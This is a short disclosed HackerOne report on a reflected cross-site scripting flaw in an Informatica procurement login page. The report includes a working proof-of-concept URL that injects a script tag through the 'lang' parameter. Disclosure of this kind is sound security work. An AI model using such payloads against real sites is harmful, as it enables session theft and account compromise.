# RXSS in http://procurement-businesscatalog.informatica.com

## Report Details
- **Report ID**: 831803
- **URL**: https://hackerone.com/reports/831803
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2020-03-26T04:38:10.132Z
- **Disclosed**: 2020-03-27T10:04:59.549Z

## Reporter
- **Username**: min4tor
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: informatica

## Vulnerability Information
Hi, this is a simple XSS in the host below:

Reproduction Steps
Visit the following URL: `http://procurement-businesscatalog.informatica.com/JPBC/login.hbc?lang=%3C/SCRIPT%3E%3CSCRIPT%3Ealert(document.domain);%3C/SCRIPT%3E`

{F760997}

## Impact

Standard XSS impact.

## Attachments
- XSS.png
